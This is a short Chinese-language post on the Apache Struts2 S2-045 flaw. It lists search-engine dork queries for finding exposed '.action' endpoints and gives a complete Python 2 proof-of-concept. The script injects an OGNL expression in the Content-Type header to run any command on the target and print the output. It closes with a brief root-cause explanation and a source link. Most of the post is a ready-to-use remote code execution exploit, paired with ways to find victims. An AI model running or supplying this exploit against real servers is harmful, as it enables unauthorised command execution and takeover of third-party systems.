# strut2-045漏洞信息

搜索引擎搜索这些关键字：  
```r
inurl:Vlogin.User.action
inurl:Mail.action
inurl:code.action
inurl:reg.action
inurl:Address.action
inurl:login.action
```

然后用Python脚本测试  
python2  
```python
#! /usr/bin/env python
# encoding:utf-8

import urllib2
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
def poc():
    if len(sys.argv) < 3:
        print '''Usage: poc.py http://172.16.12.2/example/HelloWorld.action "command"'''
        sys.exit()
    register_openers()
    datagen, header = multipart_encode({"image": open("tmp.txt", "w+")})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+str(sys.argv[2])+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)
    response = urllib2.urlopen(request)
    print response.read()
poc()
```

基本原理就是 content-type注入命令  

漏洞原因：基于Jakarta Multipart parser的文件上传模块在处理文件上传(multipart)的请求时候对异常信息做了捕获，并对异常信息做了OGNL表达式处理。但在在判断content-type不正确的时候会抛出异常并且带上Content-Type属性值，可通过精心构造附带OGNL表达式的URL导致远程代码执行[1]。  

原链接: http://www.myhack58.com/Article/html/3/62/2017/84117.htm  


2017/9/2  
